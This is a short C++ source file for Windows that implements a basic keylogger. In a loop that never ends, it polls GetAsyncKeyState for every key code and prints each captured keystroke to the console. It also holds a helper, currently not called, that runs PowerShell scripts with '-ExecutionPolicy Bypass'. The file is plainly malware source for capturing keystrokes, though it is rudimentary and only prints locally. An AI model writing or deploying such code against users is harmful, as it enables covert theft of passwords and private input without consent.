#include <windows.h>
#include <winuser.h>
#include <iostream>
#include <string>
#include <fstream>
void testpowershell(std::string path){
    std::string command = "powershell -ExecutionPolicy Bypass -File \"" + path + "\"";
    system(command.c_str());
}

void startLogging(){
    char c;
    while(true){
        for(c =0; c <=254; c++){
            if(GetAsyncKeyState(c) & 0x1){
                switch (c) {
                    case VK_BACK:
                        printf("[backspace]");
                        break;
                    case VK_RETURN:
                        printf("[enter]");
                        break;
                    case VK_SHIFT:
                        printf("[shift]");
                        break;
                    case VK_CONTROL:
                        printf("[control]");
                        break;
                    case VK_CAPITAL:
                        printf("[cap]");
                        break;
                    case VK_TAB:
                        printf("[tab]");
                        break;
                    case VK_MENU:
                        printf("[alt]");
                    case VK_LBUTTON:
                    case VK_RBUTTON:
                        break;
                    default:
                        printf("%c",c);

                }
            }
        }
    }
}
int main(){
    // std::string scriptPath =".\\scripts\\testOutput.ps1"; 
    // testpowershell(scriptPath);
    // printf("hello world changed");
    startLogging();
}

